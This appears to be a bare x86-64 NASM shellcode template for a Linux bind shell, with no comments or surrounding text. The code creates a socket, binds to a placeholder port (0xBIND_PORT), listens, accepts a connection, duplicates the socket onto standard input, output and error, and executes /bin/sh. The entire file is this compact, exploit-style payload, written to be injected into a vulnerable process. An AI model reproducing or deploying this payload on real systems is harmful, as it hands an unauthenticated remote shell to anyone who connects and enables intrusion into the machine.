BITS 64
global _start
section .text

_start:
    push   0x29
    pop    rax
    cdq
    push   0x2
    pop    rdi
    push   0x1
    pop    rsi
    syscall
    push rax
    pop rdi
    push rdx
    push rdx
    mov byte [rsp], 0x2
    mov word [rsp + 0x2], 0xBIND_PORT
    push rsp
    pop rsi
    push rdx
    push 0x10
    pop rdx
    push 0x31
    pop rax
    syscall
    pop rsi
    mov al, 0x32
    syscall
    mov al, 0x2b
    syscall
    push rax
    pop rdi
    push 0x3
    pop rsi
dupe_loop:
    dec esi
    mov al, 0x21
    syscall
    jne dupe_loop
    push rsi
    pop rdx
    push rsi
    mov rdi, '//bin/sh'
    push rdi
    push rsp
    pop rdi
    mov al, 0x3b
    syscall